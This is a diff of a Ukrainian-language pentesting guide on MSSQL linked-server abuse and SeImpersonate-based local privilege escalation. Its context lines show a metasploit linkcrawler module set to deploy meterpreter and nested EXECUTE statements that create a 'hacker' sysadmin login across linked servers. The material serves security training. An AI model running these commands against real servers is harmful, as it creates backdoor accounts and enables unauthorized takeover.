@@ -170,6 +170,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ### MSSQL Основні Хакерські Трюки
 
+
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
 {{#endref}}
@@ -226,7 +227,7 @@ inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Зверніть увагу, що metasploit намагатиметься зловживати лише функцією `openquery()` в MSSQL (отже, якщо ви не можете виконати команду з `openquery()`, вам потрібно буде спробувати метод `EXECUTE` **вручну** для виконання команд, див. нижче.)
+Зверніть увагу, що metasploit намагатиметься зловживати лише функцією `openquery()` в MSSQL (отже, якщо ви не можете виконати команду за допомогою `openquery()`, вам потрібно буде спробувати метод `EXECUTE` **вручну** для виконання команд, див. більше нижче.)
 
 ### Вручну - Openquery()
 
@@ -274,16 +275,17 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Підвищення локальних привілеїв
+## Локальне підвищення привілеїв
 
-**MSSQL локальний користувач** зазвичай має спеціальний тип привілею, званий **`SeImpersonatePrivilege`**. Це дозволяє обліковому запису "вдаватись до клієнта після аутентифікації".
+**MSSQL локальний користувач** зазвичай має спеціальний тип привілею, званий **`SeImpersonatePrivilege`**. Це дозволяє обліковому запису "імітувати клієнта після аутентифікації".
 
-Стратегія, яку розробили багато авторів, полягає в тому, щоб змусити службу SYSTEM аутентифікуватись до зловмисної або атаки "людина посередині" служби, яку створює зловмисник. Ця зловмисна служба потім може вдаватися до служби SYSTEM під час спроби аутентифікації.
+Стратегія, яку розробили багато авторів, полягає в тому, щоб змусити службу SYSTEM аутентифікуватися до зловмисної або атаки "людина посередині" служби, яку створює зловмисник. Ця зловмисна служба потім може імітувати службу SYSTEM під час спроби аутентифікації.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) має колекцію цих різних технік, які можна виконати за допомогою команди `execute-assembly` Beacon.
 
 ### NTLM Relay для управлінської точки SCCM (витягування секретів OSD)
-Дивіться, як стандартні SQL ролі **Управлінських Точок** SCCM можуть бути зловживані для виведення облікового запису мережевого доступу та секретів послідовності завдань безпосередньо з бази даних сайту:
+Дивіться, як стандартні SQL ролі **Управлінських Точок** SCCM можуть бути зловживані для виведення секретів облікового запису мережевого доступу та послідовностей завдань безпосередньо з бази даних сайту:
+
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
 {{#endref}}
